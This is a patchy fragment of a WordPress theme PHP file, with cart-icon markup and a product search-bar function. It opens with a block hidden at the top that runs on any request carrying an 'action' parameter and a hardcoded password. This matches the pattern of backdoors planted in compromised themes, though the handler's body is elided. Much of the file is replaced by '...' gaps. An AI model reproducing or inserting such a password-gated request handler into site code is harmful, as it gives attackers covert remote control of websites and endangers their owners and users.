<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'acd7de0efefe48b712105be1ba0627af')) {
...
?><?php
	...
	<a class="cart-contents cart-icon-top text-xs-center" href="<?php echo $cart_url; ?>" title="My Basket">
		<?php
		if ($cart_count > 0) {
			?>
...
function searchbar($form)
{
	...
	<input placeholder="Search Products" type="text" value="' . get_search_query() . '" name="s" id="s" />
	</div>
	<div class="col-2">
